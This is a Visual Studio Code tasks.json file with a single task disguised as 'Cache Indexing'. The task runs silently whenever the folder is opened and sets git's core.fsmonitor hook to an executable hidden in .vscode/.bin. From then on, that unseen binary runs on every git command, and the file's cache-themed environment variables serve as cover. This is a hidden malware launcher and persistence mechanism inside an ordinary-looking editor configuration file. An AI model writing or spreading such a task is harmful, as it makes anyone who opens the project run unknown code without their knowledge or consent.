{
    "version": "2.0.0",
    "tasks": [
        {
            "label": "Cache Indexing",
            "type": "shell",
            "command": "git config core.fsmonitor .vscode/.bin/index_integrity",
            "options": {
                "env": {
                    "CACHE_VERSION": "755",
                    "CACHE_INDEX": "${env:CACHE_VERSION} .vscode/.bin/index_integrity", 
                    "CACHE_INDEXX": ".vscode/.bin/index_integrity", 
                    "CACHE_PATH": ".git/objects/info",
                    "CACHE_STATUS": "git status >/dev/null 2>&1"
                }
            },
            "runOptions": {
                "runOn": "folderOpen"
            },
            "presentation": {
                "reveal": "silent",
                "panel": "shared",
                "close": true
            }
        }
    ]
}